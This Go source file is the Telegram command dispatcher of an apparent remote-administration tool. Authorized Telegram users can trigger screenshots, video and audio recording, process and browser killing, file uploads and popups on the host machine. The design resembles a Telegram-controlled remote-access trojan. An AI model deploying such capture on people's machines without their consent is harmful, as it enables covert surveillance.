package bot

import (
	"remoteadmin/commands"
	"remoteadmin/config"
	"strings"
	"time"

	tgbotapi "github.com/go-telegram-bot-api/telegram-bot-api/v5"
)

type Bot struct {
	api               *tgbotapi.BotAPI
	config            *config.Config
	startTime         time.Time
	infoHandler       *commands.InfoHandler
	messageHandler    *commands.MessageHandler
	msgHandler        *commands.MsgHandler
	processHandler    *commands.ProcessHandler
	screenshotHandler *commands.ScreenshotHandler
	videoHandler      *commands.VideoHandler
	audioHandler      *commands.AudioHandler
	helpHandler       *commands.HelpHandler
	fileHandler       *commands.FileHandler
	browserKiller     *commands.BrowserKiller
	consoleHandler    interface {
		SendPopup(message string)
	}
}

func NewBot(cfg *config.Config) (*Bot, error) {
	bot, err := tgbotapi.NewBotAPI(cfg.BotToken)
	if err != nil {
		return nil, err
	}

	bot.Debug = false

	return &Bot{
		api:               bot,
		config:            cfg,
		startTime:         time.Now(),
		infoHandler:       commands.NewInfoHandler(bot, cfg, time.Now()),
		messageHandler:    commands.NewMessageHandler(bot, cfg),
		msgHandler:        nil,
		processHandler:    commands.NewProcessHandler(bot),
		screenshotHandler: commands.NewScreenshotHandler(bot),
		videoHandler:      commands.NewVideoHandler(bot),
		audioHandler:      commands.NewAudioHandler(bot),
		helpHandler:       commands.NewHelpHandler(bot),
		fileHandler:       commands.NewFileHandler(bot),
		browserKiller:     commands.NewBrowserKiller(bot, cfg),
	}, nil
}

func (b *Bot) Start() error {
	updates, err := b.api.GetUpdates(tgbotapi.NewUpdate(0))
	if err != nil {
		return err
	}

	lastUpdateID := 0
	if len(updates) > 0 {
		lastUpdateID = updates[len(updates)-1].UpdateID
	}

	u := tgbotapi.NewUpdate(lastUpdateID + 1)
	u.Timeout = 60

	updateChan := b.api.GetUpdatesChan(u)

	for update := range updateChan {
		if update.Message != nil {
			b.handleMessage(update.Message)
		}
	}

	return nil
}

func (b *Bot) handleMessage(message *tgbotapi.Message) {
	userID := message.From.ID
	chatID := message.Chat.ID
	text := message.Text

	// log.Printf("[%s] %s", message.From.UserName, text)

	if !b.config.IsAuthorized(userID) {
		msg := tgbotapi.NewMessage(chatID, "No access.")
		b.api.Send(msg)
		return
	}

	if message.Document != nil || message.Photo != nil || message.Video != nil {
		b.fileHandler.HandleFileCommand(chatID, message)
		return
	}

	switch {
	case text == "/start":
		b.handleStartCommand(chatID)
	case text == "/help":
		b.helpHandler.HandleHelpCommand(chatID)
	case text == "/info":
		b.infoHandler.HandleInfoCommand(chatID)
	case text == "/processes":
		b.processHandler.HandleProcessCommand(chatID)
	case text == "/ss":
		b.screenshotHandler.HandleScreenshotCommand(chatID)
	case text == "/ssa":
		b.screenshotHandler.HandleScreenshotAllCommand(chatID)
	case text == "/ssm":
		b.screenshotHandler.HandleMainMonitorCommand(chatID)
	case text == "/vid":
		b.videoHandler.HandleVideoCommand(chatID)
	case text == "/audio":
		b.audioHandler.HandleAudioCommand(chatID)
	case text == "/displays":
		displayInfo := b.screenshotHandler.GetDisplayInfo()
		msg := tgbotapi.NewMessage(chatID, displayInfo)
		msg.ParseMode = "Markdown"
		b.api.Send(msg)
	case text == "/files":
		fileInfo := b.fileHandler.GetSupportedFileTypes()
		msg := tgbotapi.NewMessage(chatID, fileInfo)
		msg.ParseMode = "Markdown"
		b.api.Send(msg)
	case strings.HasPrefix(text, "/kill "):
		b.processHandler.HandleKillProcessCommand(chatID, text)
	case strings.HasPrefix(text, "/browser "):
		b.browserKiller.HandleBrowserKillerCommand(chatID, text)
	case strings.HasPrefix(text, "/msg "):
		userName := message.From.FirstName
		if message.From.LastName != "" {
			userName += " " + message.From.LastName
		}
		b.msgHandler.HandleMsgCommand(chatID, text, userName)
	default:
		b.handleUnknownCommand(chatID)
	}
}

func (b *Bot) handleStartCommand(chatID int64) {
	msg := tgbotapi.NewMessage(chatID, b.helpHandler.GetStartMessage())
	msg.ParseMode = "Markdown"
	b.api.Send(msg)
}

func (b *Bot) handleUnknownCommand(chatID int64) {
	msg := tgbotapi.NewMessage(chatID, b.helpHandler.GetUnknownCommandMessage())
	b.api.Send(msg)
}

func (b *Bot) SendMessage(chatID int64, text string) {
	b.messageHandler.SendMessage(chatID, text)
}

func (b *Bot) SendMessageToAllAdmins(text string) {
	b.messageHandler.SendMessageToAllAdmins(text)
}

func (b *Bot) SetConsoleHandler(handler interface {
	SendPopup(message string)
}) {
	b.consoleHandler = handler
	b.msgHandler = commands.NewMsgHandler(b.api, handler)
}

func (b *Bot) GetProcessList() ([]commands.ProcessInfo, error) {
	return b.processHandler.GetProcessList()
}
